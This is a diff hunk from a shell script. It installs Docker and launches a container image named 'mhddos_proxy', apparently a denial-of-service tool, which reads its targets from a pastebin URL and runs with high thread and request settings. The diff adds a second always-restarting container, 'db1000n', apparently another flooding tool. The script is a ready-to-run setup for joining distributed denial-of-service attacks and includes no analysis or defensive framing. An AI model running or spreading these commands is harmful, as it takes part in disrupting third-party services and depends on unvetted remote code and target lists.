@@ -10,3 +10,4 @@ sudo add-apt-repository -y "deb [arch=amd64] https://download.docker.com/linux/u
 sudo apt-get -y install docker-ce docker-ce-cli containerd.io
 
 sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://pastebin.com/raw/KahaAEgH -t 1000 -p 1000 --rpc 1000
+sudo docker run -d --pull always --restart always ghcr.io/arriven/db1000n
